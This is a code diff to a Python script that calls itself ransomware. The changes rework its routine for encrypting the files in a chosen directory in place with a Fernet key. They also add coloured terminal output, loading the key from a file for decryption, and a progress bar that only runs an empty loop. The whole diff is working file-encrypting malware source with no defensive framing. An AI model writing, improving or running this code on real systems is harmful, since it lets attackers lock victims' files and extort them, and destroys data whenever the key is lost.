@@ -24,6 +24,8 @@ o`   'oooo()  | ________   _   _)
 
 # --> try importing modules
 try:
+	# --> import colored for terminal coloring
+	from colored import fg, attr
 	# --> Import subprocess for executing system commands.
 	import subprocess as subp
 	# --> Import time to pause execution of program
@@ -42,7 +44,7 @@ try:
 	from pyfiglet import Figlet
 	# --> Try importing cryptography module class
 	try:
-		from cryptography.fernet import Fernet, MultiFernet
+		from cryptography.fernet import Fernet
 	# --> If any errors occurs importing the cryp module
 	# --> Install it with the following command
 	except:
@@ -71,7 +73,7 @@ class Ransomware:
 		$ Get directory to encrypt/decrypt
 		$ Get name of file to store key
 		'''
-		print("[+] Invoking Ransomware constructor")
+		print("%s[+] Invoking Ransomware %s" % (fg(166), attr(0)))
 		# --> Ferney key
 		self.key=None
 		# --> Fernet object
@@ -92,6 +94,7 @@ class Ransomware:
 		$ Find files that contain the extension specified in our file_ext_targets list
 		$ Returns a list that contains valid files to encrypt
 		'''
+		print('[+] Gathering all files with target file extensions')
 		# --> List containing all files that end with the extensions
 		# --> Defined in the file_ext_targets list 
 		valid_files_to_encrypt = []
@@ -120,33 +123,45 @@ class Ransomware:
 		$ Opening all files in the list of files argument
 		$ and send the contents of these files to be encrypted
 		'''
+		for file in list_of_files:
+			# --> open input file 
+			with open(file, 'rb') as input_file:
+				# --> read the files contents
+				file_content = input_file.read().strip()
+				# --> open output file
+				with open(file, 'wb') as output_file:
+					# --> If action is equal encrypt
+					if self.action == 'encrypt':
+
+						# ENCRYPT IT!!!!
+						encrypted = self.encrypt_it(file, file_content)
+						# --> write encrypted data back into file
+						output_file.write(encrypted+b'\n')
+					# --> If action is not encrypt
+					else:
+						# DECRYPT IT!!!!
+						decrypted = self.decrypt_it(file, file_content)
+						# --> write decrypted data back into file
+						output_file.write(decrypted+b'\n')
+
+		self.display_progres()
+
+
+	def display_progres(self):
 		progress_bar_info = ''
 		# --> If the action variable is set to encrypt
 		if self.action == 'encrypt':
 			# --> Set the progress bar title to the following
-			progress_bar_info = 'Encrypting files'
+			progress_bar_info = 'Files Encrypted'
 		# --> If the action variable is set to decrypt
 		else:
 			# --> Set the progress bar title to the following
-			progress_bar_info = 'Decrypting files'
+			progress_bar_info = 'Files Decrypted'
 
-		for file in list_of_files:
-			# --> open file for reading + writing
-			with open(file, 'wb+') as f:
-				# --> read the files contents
-				file_content = f.read()
-				# --> If action is equal encrypt
-				if self.action == 'encrypt':
-					# ENCRYPT IT!!!!
-					encrypted = self.encrypt_it(file, file_content)
-					# --> write encrypted data back into file
-					f.write(encrypted)
-				# --> If action is not encrypt
-				else:
-					# DECRYPT IT!!!!
-					decrypted = self.decrypt_it(file, file_content)
-					# --> write decrypted data back into file
-					f.write(decrypted.decode('utf8'))
+		# --> Display progress bar
+		print('\n')
+		for _ in tqdm(range(10000000), desc=progress_bar_info):
+			pass
 
 
 	def store_key(self):
@@ -164,7 +179,18 @@ class Ransomware:
 		$ Retrieve a key from a file
 		'''
 		self.key = open(self.keyfile,'rb').read()
-	
+
+
+	def instantiate_fernet(self):
+		# --> Attempt to generate Fernet object
+		try:
+			print('%s[+] Instantiating Fernet object for our cryptographic functions %s' % (fg(76), attr(0)))
+			# --> Fernet object instantiation
+			self.linear_b = Fernet(self.key)
+		except:
+			# --> If it fails
+			print('[-] Unable to instantiate Fernet object for encryption')
+
 
 	def key_gen(self):
 		'''
@@ -176,32 +202,23 @@ class Ransomware:
 		self.key = Fernet.generate_key()
 		# --> Call method to store the previously generated key
 		self.store_key()
-		# --> Attempt to generate Fernet object
-		try:
-			# --> Fernet object instantiation
-			self.linear_b = Fernet(self.key)
-		except:
-			# --> If it fails
-			print('[-] Unable to instantiate Fernet object for encryption')
 
 
 	def encrypt_it(self, name_of_curr_file, data_to_encrypt):
 		'''
 		$ Encrypting all files in the directory stored in the directory variable
 		'''
-		print(f'[+] Encrypting {name_of_curr_file}')
+		print(f'%s[+] File to encypt --> {name_of_curr_file} %s' % (fg(9), attr(0)))
 
 		# --> Return the encrypted version of the contents of a file
-		token = self.linear_b.encrypt(data_to_encrypt)
-
-		return token
+		return self.linear_b.encrypt(data_to_encrypt)
 
 
 	def decrypt_it(self, name_of_curr_file, data_to_decrypt):
 		'''
 		$ Decrypt all files in the directory stored in the directory variable
 		'''
-		print(f'[+] Decrypting {name_of_curr_file}')
+		print(f'%s[+] File to decrypt --> {name_of_curr_file} %s' % (fg(27), attr(0)))
 		# --> Return the decrypted data of an encrypted file
 		return self.linear_b.decrypt(data_to_decrypt)
 
@@ -229,7 +246,7 @@ def parse_arguments():
 	# --> Retrieve arguments that were passed 
 	args = parser.parse_args()
 	# --> return the arguments that were passed 
-	return args.directory, args.action, args.keyfile
+	return args.directory, args.action.lower(), args.keyfile
 
 
 def signature():
@@ -250,6 +267,7 @@ def initiate():
 	parse_arguments()
 	# --> Get arguments
 	directory, action, keyfile = parse_arguments()
+
 	# --> If no key file was passed, use the default 
 	if keyfile == None:
 		# -->  Instantiate Ransomware object with no key file
@@ -258,14 +276,19 @@ def initiate():
 	else:
 		# --> Instantiate Ransomware object with key file
 		Enigma = Ransomware(action=action,directory=directory,keyfile=keyfile)
+
 	# --> Scan specified directory for files with valid extensions
 	valid_target_files = Enigma.get_valid_files()
-	'''
-	--> Obtianing Fernet key for encryption/decryption
-	--> Change this to key = Enigma.get_key() to retrieve key from
-		a file
-	'''
-	Enigma.key_gen()
+	# --> If decrypting, obtain key from key file
+	if action != 'encrypt':
+		# --> get key from file
+		Enigma.get_key_from_file()
+	else:
+		# --> Generating and storing Fernet key for encryption/decryption
+		Enigma.key_gen()
+
+	# --> Instantiate our fernet object according to a specific
+	Enigma.instantiate_fernet()
 	# --> Encrypt or decrypt files based on the crytographic action
 	# --> that was passed as an argument
 	Enigma.encrypt_or_decrypt(valid_target_files)
